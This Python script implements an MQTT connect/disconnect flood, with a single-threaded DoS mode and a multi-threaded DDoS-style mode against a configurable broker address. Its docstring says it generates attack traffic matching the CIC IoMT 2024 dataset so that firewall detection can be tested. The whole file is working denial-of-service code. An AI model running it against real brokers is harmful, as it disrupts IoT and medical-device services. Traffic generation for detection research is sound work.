"""
connect_flood_client.py — MQTT CONNECT/DISCONNECT flood attack.

Generates the MQTT-DoS-Connect_Flood (serial) and MQTT-DDoS-Connect_Flood
(parallel) traffic signatures from the CIC IoMT 2024 dataset.

Two modes:
  --mode serial    One thread: connect → disconnect, repeat at maximum rate.
                   Matches MQTT-DoS-Connect_Flood (single-source).
  --mode parallel  Many threads each doing the same loop concurrently.
                   Matches MQTT-DDoS-Connect_Flood (distributed sources).

Network signature the firewall should detect:
  - Very high SYN count from same source IP
  - Many extremely short-lived TCP flows (sub-100 ms duration)
  - High Srate, near-zero payload bytes per flow
  - Low Weight (bwd = only TCP ACK from broker, fwd >> bwd)

Environment variables:
  CONNECT_FLOOD_MODE        serial | parallel (default: serial)
  CONNECT_FLOOD_THREADS     Number of threads for parallel mode (default: 20)
  ATTACK_RATE_HZ            Connections per second per thread (0 = max, default: 0)
  ATTACK_BURST_COUNT        Stop after N total connections (0 = infinite, default: 0)
  GATEWAY_IP / GATEWAY_PORT
"""

from __future__ import annotations

import os
import sys
import threading
import time
import uuid
from pathlib import Path

import paho.mqtt.client as mqtt
from dotenv import load_dotenv

load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP   = os.getenv("GATEWAY_IP", "127.0.0.1")
GATEWAY_PORT = int(os.getenv("GATEWAY_PORT", "1883"))
NUM_THREADS  = int(os.getenv("CONNECT_FLOOD_THREADS", "20"))
RATE_HZ      = float(os.getenv("ATTACK_RATE_HZ", "0"))
BURST_COUNT  = int(os.getenv("ATTACK_BURST_COUNT", "0"))

_total_lock  = threading.Lock()
_total_conns = 0
_stop_event  = threading.Event()


def _connect_loop(thread_id: int) -> None:
    global _total_conns
    sleep_s = 1.0 / RATE_HZ if RATE_HZ > 0 else 0

    while not _stop_event.is_set():
        client_id = f"cf-{thread_id:03d}-{uuid.uuid4().hex[:6]}"
        c = mqtt.Client(client_id=client_id, clean_session=True)
        c.on_connect = lambda *_: None

        try:
            c.connect(GATEWAY_IP, GATEWAY_PORT, keepalive=5)
            c.loop_start()
            time.sleep(0.01)   # let the CONNACK arrive, then disconnect immediately
            c.disconnect()
            c.loop_stop()
        except OSError:
            time.sleep(0.1)
            continue
        finally:
            try:
                c.loop_stop()
            except Exception:
                pass

        with _total_lock:
            _total_conns += 1
            n = _total_conns

        if n % 100 == 0:
            print(f"[CONNECT-FLOOD] thread={thread_id:03d}  total_connections={n}")

        if BURST_COUNT > 0 and n >= BURST_COUNT:
            _stop_event.set()
            break

        if sleep_s:
            time.sleep(sleep_s)


def run_serial() -> None:
    print(f"[CONNECT-FLOOD] Mode: serial (MQTT-DoS-Connect_Flood)  "
          f"target: {GATEWAY_IP}:{GATEWAY_PORT}")
    print(f"[CONNECT-FLOOD] Rate: {'max' if RATE_HZ == 0 else f'{RATE_HZ:.1f} conn/s'}  "
          f"Burst: {'unlimited' if BURST_COUNT == 0 else BURST_COUNT}")
    try:
        _connect_loop(0)
    except KeyboardInterrupt:
        _stop_event.set()
    print(f"[CONNECT-FLOOD] Done. Total connections: {_total_conns}")


def run_parallel() -> None:
    print(f"[CONNECT-FLOOD] Mode: parallel (MQTT-DDoS-Connect_Flood)  "
          f"threads: {NUM_THREADS}  target: {GATEWAY_IP}:{GATEWAY_PORT}")
    threads = [
        threading.Thread(target=_connect_loop, args=(i,), daemon=True)
        for i in range(NUM_THREADS)
    ]
    try:
        for t in threads:
            t.start()
        while not _stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        _stop_event.set()

    for t in threads:
        t.join(timeout=2)
    print(f"[CONNECT-FLOOD] Done. Total connections: {_total_conns}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="MQTT CONNECT/DISCONNECT flood")
    parser.add_argument("--mode", choices=["serial", "parallel"], default="serial",
                        help="serial=DoS (single source) | parallel=DDoS (concurrent threads)")
    args = parser.parse_args()

    if args.mode == "parallel":
        run_parallel()
    else:
        run_serial()
